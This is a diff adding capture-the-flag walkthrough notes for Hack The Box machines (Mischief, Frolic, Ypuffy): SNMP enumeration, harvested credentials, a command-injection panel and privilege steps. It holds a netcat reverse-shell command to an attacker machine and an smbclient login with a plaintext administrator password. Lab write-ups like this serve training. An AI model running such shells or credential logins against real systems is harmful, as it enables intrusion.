@@ -1,3 +1,26 @@
+HTB MISCHIEF
+1)Enumeration shows open port 22, 3366 and upd 161 running snmp 
+2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
+3)searching for good info i found on snmp log a user and a password:   loki:godofmischiefisloki running on a SimpleHTTPAuthServer.
+4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login 
+5)There some new credentials in here loki:trickeryanddeceit
+6)we found an image 
+7)image its rabitt hole
+8)from nmap full scan we notice some more ports and from snmpwalk we notice apache and mysql its running but not showing up so it mus be ipv6.
+9)so we download an ipv6 ennumeration tool like enyx for snmp run it and shows ipv6 address: [dead:beef::250:56ff:feb9:a728]
+10)remember ipv6 adress changes every reboot
+11) now we use it in browser and another login page tried all creds with user we got so far but theyre not working.
+12) keep enummerating
+13)tried all basic users standar users, none seems to work after i remember another standard user administrator -.- that worked with second password.
+14)we managed to login to the Command Execution Panel and try a few commands and looks that theyre not working.
+15)In fact they work but as we see in snmpwalk enumeration all the output its being send to /dev/null so we must find a way to redirect it to us.
+16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>> 
+       so in shorter explaination we redirect the output to the standard or STDOUT and we cat /home/loki/*  (all) because
+       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and 
+	   redirect it to stdout!
+17)Privilege Scalation
+
+
 HTB FROLIC
  
 1) As always enum
@@ -122,7 +145,9 @@ if(isset($_REQUEST['cmd'])){
  
 5)Using nc.exe establish a reverse connection to attacker machine wiht nc -nv 10.10.xx.xx 4444 -e cmd.exe
 6)notice the weird distro folder containig ubuntu so we must find bash.exe running dir bash.exe /s /p
-7)run bash.exe and search for the past and login with smbclient with credentials to read the root.txt flag
+7)run bash.exe and search for the past and login with smbclient with credentials:
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
+8)GET the root.txt flag
  
 HTB YPUFFY
 1) Enum ldap and find the hashes for alice user
